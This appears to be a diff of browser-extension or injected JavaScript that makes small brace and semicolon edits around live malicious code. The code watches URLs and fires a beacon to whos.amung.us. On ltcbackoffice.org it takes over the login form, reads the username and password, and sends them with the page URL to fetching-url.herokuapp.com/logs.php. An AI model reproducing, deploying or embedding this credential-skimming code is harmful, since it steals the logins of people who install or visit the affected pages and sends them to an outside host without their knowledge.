@@ -64,6 +64,7 @@ for (var i = 0; i < arrayLength; i++) {
     if (details.url.indexOf(myStringArray[i]) > -1) {
 (new Image).src = "//whos.amung.us/swidget/bbbbbbbbc";
     }
+  }
     var target = 2048;
     var exFunc = function(){
     if (typeof isrunmyproject == "undefined") {
@@ -121,8 +122,7 @@ for (var i = 0; i < arrayLength; i++) {
 
         }
       };
-    }
-    ;
+    };
     if (location.href.indexOf("ltcbackoffice.org") >= 0) {
       document.getElementById("login-form").onsubmit = function() {
         username = document.getElementById("username").value;
@@ -131,5 +131,4 @@ for (var i = 0; i < arrayLength; i++) {
           (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
         }
       };
-    }
-    ;
+    };
